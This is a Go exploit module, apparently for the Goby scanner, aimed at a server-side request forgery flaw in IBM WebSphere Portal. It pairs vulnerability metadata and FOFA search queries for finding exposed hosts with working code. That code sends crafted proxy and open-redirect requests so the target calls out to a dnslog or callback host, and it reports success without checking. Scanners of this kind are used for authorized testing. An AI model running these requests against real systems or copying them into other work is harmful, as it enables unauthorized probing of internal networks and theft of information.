package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Websphere Portal SSRF",
    "Description": "<p>IBM WebSphere Portal consists of middleware, applications (called portlets), and development tools used to build and manage secure business-to-business (B2B), business-to-customer (B2C), and business-to-employee (B2E) portals.</p><p>IBM WebSphere Portal has server-side request forgery vulnerabilities, and attackers can use vulnerabilities to detect intranet to obtain sensitive information.</p>",
    "Impact": "Websphere Portal SSRF",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.ibm.com/\">https://www.ibm.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Websphere Portal",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "Websphere Portal SSRF漏洞",
            "Description": "<p>IBM WebSphere Portal 由用于构建和管理安全的企业对企业（B2B）、企业对客户（B2C）和企业对雇员（B2E）门户网站的中间件、应用程序（称为 portlet）和开发工具组成。</p><p>IBM WebSphere Portal 存在服务端请求伪造漏洞，攻击者可利用漏洞探测内网获取敏感信息。</p>",
            "Impact": "<p>IBM WebSphere Portal 存在服务端请求伪造漏洞，攻击者可利用漏洞探测内网获取敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.ibm.com/\">https://www.ibm.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Websphere Portal",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Websphere Portal SSRF",
            "Description": "<p>IBM WebSphere Portal consists of middleware, applications (called portlets), and development tools used to build and manage secure business-to-business (B2B), business-to-customer (B2C), and business-to-employee (B2E) portals.</p><p>IBM WebSphere Portal has server-side request forgery vulnerabilities, and attackers can use vulnerabilities to detect intranet to obtain sensitive information.</p>",
            "Impact": "Websphere Portal SSRF",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.ibm.com/\">https://www.ibm.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Websphere Portal",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "body=\"/wps/contenthandler\" || body=\"Websphere Portal\" || body=\"/wps/portal/calligaris\"",
    "GobyQuery": "body=\"/wps/contenthandler\" || body=\"Websphere Portal\" || body=\"/wps/portal/calligaris\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.ibm.com/",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://blog.assetnote.io/2021/12/25/advisory-websphere-portal/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "6.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10250"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri1 := "/docpicker/internal_proxy/http/" + checkUrl
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg1)
			uri2 := "/wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://" + checkUrl
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg2)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)
			uri1 := "/docpicker/internal_proxy/http/" + cmd
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			uri2 := "/wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://" + cmd
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			expResult.Output = "it is a blind ssrf"
			expResult.Success = true
			return expResult
		},
	))
}
